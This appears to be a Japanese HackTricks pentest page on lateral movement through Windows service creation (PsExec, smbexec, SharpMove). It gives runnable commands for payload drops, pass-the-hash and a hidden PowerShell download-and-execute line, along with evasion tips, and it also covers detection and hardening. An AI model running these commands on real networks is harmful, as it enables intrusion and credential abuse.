# Remote Service Execution (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## どのように動作するか

これらの手法は、SMB/RPC経由でWindows Service Control Manager (SCM) をリモートから悪用し、ターゲットホスト上でコマンドを実行します。Service Control Manager Remote Protocol (SCMR) は、リモートコンピューター上のWindowsサービスを構成・制御するためのRPCベースのインターフェースです。十分な権限があれば、バイナリパスにコマンドを含むサービスを作成または再構成し、そのサービスを開始することで、リモートからコマンドを実行できます。<sup>[[5]](#references)</sup> 一般的な流れは次のとおりです。

1. SMB/RPC (TCP/445) 経由でターゲットに認証します。選択した手法でファイルの配置や出力の取得が必要な場合は、ADMIN$共有にアクセスします。
2. 実行する実行ファイルをコピーするか、サービスが実行するLOLBASコマンドラインを指定します。
3. SCM (MS-SCMR over \PIPE\svcctl) 経由で、指定したコマンドまたはバイナリを参照するサービスをリモートで作成します。
4. サービスを開始してpayloadを実行し、必要に応じて名前付きパイプ経由でstdin/stdoutを取得します。
5. サービスを停止し、クリーンアップします（サービスと配置したバイナリを削除します）。

要件/前提条件:
- ターゲット上のLocal Administrator (SeCreateServicePrivilege)、またはターゲット上でサービスを作成する明示的な権限。
- SMB (445) に到達でき、ホストのファイアウォールでRemote Service Managementが許可されていること。ファイルの配置や出力の取得にADMIN$を使用する手法では、ADMIN$が利用可能であること。
- UAC Remote Restrictions: ローカルアカウントでは、組み込みのAdministratorを使うかLocalAccountTokenFilterPolicy=1を設定しない限り、トークンフィルタリングによってネットワーク経由の管理者アクセスがブロックされることがあります。
- KerberosとNTLM: ホスト名/FQDNを使うとKerberosが有効になり、IPアドレスで接続すると多くの場合NTLMにフォールバックします（セキュリティ強化された環境ではブロックされることがあります）。

サービスアカウントが指定されていない場合、`CreateService`は広範なローカル権限を持つ`LocalSystem`を使用します。このため、SCM経由で実行に成功した場合の影響は大きくなります。ただし、これはUACやMicrosoft Defenderを自動的に無効化するものではありません。呼び出し元には引き続きリモートSCM権限が必要であり、エンドポイントの制御機能によってサービスやpayloadが検査またはブロックされる可能性があります。<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### sc.exeを使った手動のScExec/WinExec

以下は、最小限のサービス作成手順です。サービスのイメージには、配置したEXEやcmd.exe、powershell.exeなどのLOLBASを指定できます。

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notes:
- サービスではない EXE を起動するとタイムアウトエラーが発生する場合がありますが、実行自体は行われます。
- OPSECへの配慮を高めるには、fileless commands（cmd /c、powershell -enc）を優先するか、配置した痕跡を削除してください。

詳細な手順はこちら: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## ツールと使用例

### Sysinternals PsExec.exe

- SMBを使用してADMIN$にPSEXESVC.exeを配置し、一時サービス（デフォルト名はPSEXESVC）をインストールして、named pipes経由でI/Oを中継する、従来型の管理ツールです。
- 使用例:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- WebDAV 経由で Sysinternals Live から直接起動できます。

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- サービスのインストール／アンインストールイベントが記録され（-r が指定されない場合、サービス名は通常 PSEXESVC）、実行中に C:\Windows\PSEXESVC.exe が作成されます。

### Impacket psexec.py（PsExec風）

- RemCom風のサービスを埋め込みで使用します。ADMIN$ 経由で一時的なサービスバイナリ（一般にランダムな名前）を配置し、サービス（デフォルトは通常 RemComSvc）を作成して、名前付きパイプ経由で I/O を中継します。

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Kaliでは、Impacketのサンプルは`/usr/share/doc/python3-impacket/examples/`に配置されている場合があります。パスワードが指定されていない場合、ツールは入力を求めます。Impacketの`-k`はNTLMの代わりにKerberos認証を要求し、通常は現在の認証情報キャッシュまたは指定された認証情報を使用します。

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Artifacts
- C:\Windows\ に一時的な EXE（ランダムな8文字）を作成します。サービス名は、変更されない限り RemComSvc がデフォルトです。

### Impacket smbexec.py (SMBExec)

- cmd.exe を起動する一時サービスを作成し、I/O に名前付きパイプを使用します。通常、完全な EXE payload のドロップを避け、コマンド実行は半対話型です。

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral)（C#）は、service-based execを含む複数の横展開手法を実装しています。

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) は、SCM やサービスの変更・作成を含む、Windows の複数のメカニズムを介した認証済みリモート実行をサポートしています。

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- CrackMapExecを使用して、異なるバックエンド（psexec/smbexec/wmiexec）経由で実行することもできます：

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec with SharpMove

SCMアクションは`WindowsDebug`という名前のサービスを作成し、リモートホストにすでに存在するpayloadを指定します。<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC、検知、痕跡

PsExec-like techniques の使用時にホストやネットワーク上に残る一般的な痕跡:
- ターゲット上で、使用した管理者アカウントに対する Security 4624 (Logon Type 3) および 4672 (Special Privileges)。
- ADMIN$ へのアクセスや、サービスバイナリ (例: PSEXESVC.exe またはランダムな8文字の .exe) の作成/書き込みを示す Security 5140/5145 File Share および File Share Detailed イベント。
- ターゲット上でのサービスインストールを示す、Service Control Manager による **System** 7045: PSEXESVC、RemComSvc、またはカスタム名 (`-r` / `-service-name`) など。これはサービスがインストールされたことを証明しますが、そのイメージが実行されたことまでは証明しません。タイムスタンプとイメージパスを、プロセスイベントや、利用可能であれば一致するサービスイメージの prefetch エントリと照合してください。<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) の services.exe またはサービスイメージ、3 (Network Connect)、C:\Windows\ 内の 11 (File Create)、および \\.\pipe\psexesvc、\\.\pipe\remcom_*、またはランダム化された同等の名前などのパイプに対する 17/18 (Pipe Created/Connected)。
- Sysinternals EULA のレジストリ痕跡: オペレーター側ホスト上の HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 (抑制されていない場合)。

ハンティングのアイデア
- ImagePath に cmd.exe /c、powershell.exe、または TEMP の場所が含まれるサービスインストールにアラートを設定する。
- ParentImage が C:\Windows\PSEXESVC.exe のプロセス作成や、LOCAL SYSTEM として実行される services.exe の子プロセスがシェルを起動しているケースを調査する。
- -stdin/-stdout/-stderr で終わる名前付きパイプや、既知の PsExec clone のパイプ名にフラグを立てる。

## よくある問題のトラブルシューティング
- サービス作成時の Access is denied (5): 実際にはローカル管理者ではない、ローカルアカウントに対する UAC リモート制限がある、またはサービスバイナリのパスで EDR tampering protection が働いている。
- ネットワーク パスが見つからない (53)、または接続できない: ファイアウォールが SMB/RPC をブロックしている、または管理共有が無効になっている。
- Kerberos は失敗するが NTLM はブロックされている: IP ではなくホスト名/FQDN で接続し、適切な SPN を設定するか、Impacket の使用時にチケットとともに -k/-no-pass を指定する。
- サービスの起動がタイムアウトするが payload は実行された: 実際のサービスバイナリではない場合に想定される。出力をファイルに保存するか、リアルタイムの I/O には smbexec を使用する。

## Hardening に関する注意事項
- Windows 11 24H2 と Windows Server 2025 では、送信接続 (および Windows 11 では受信接続) で SMB signing がデフォルトで必須です。有効な認証情報を使った正規の PsExec の使用には影響しませんが、署名されていない SMB relay の悪用を防ぎ、署名に対応していないデバイスに影響する場合があります。<sup>[[2]](#references)</sup>
- 新しい SMB client NTLM blocking (Windows 11 24H2/Server 2025) により、IP アドレスや Kerberos 非対応サーバーへの接続時に NTLM へのフォールバックが妨げられる場合があります。Hardening された環境では、これにより NTLM ベースの PsExec/SMBExec が機能しなくなります。Kerberos (ホスト名/FQDN) を使用するか、正当な理由がある場合は例外を設定してください。<sup>[[2]](#references)</sup>
- 最小権限の原則: ローカル管理者のメンバーシップを最小限にし、Just-in-Time/Just-Enough Admin を優先し、LAPS を適用して、7045 によるサービスインストールを監視/アラートする。

## 関連項目

- WMI ベースのリモート実行 (多くの場合、より fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM ベースのリモート実行:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Windows Server 2025 と Windows 11 における SMB セキュリティの強化](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [認証情報を使って Windows マシンを掌握する - 第2部 (PSExec とサービス)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – システムイベントログを使用した予期しない再起動のトラブルシューティング](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - Service Control Manager Remote Protocol の概要](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - LocalSystem アカウント](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - `CreateService` 関数](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
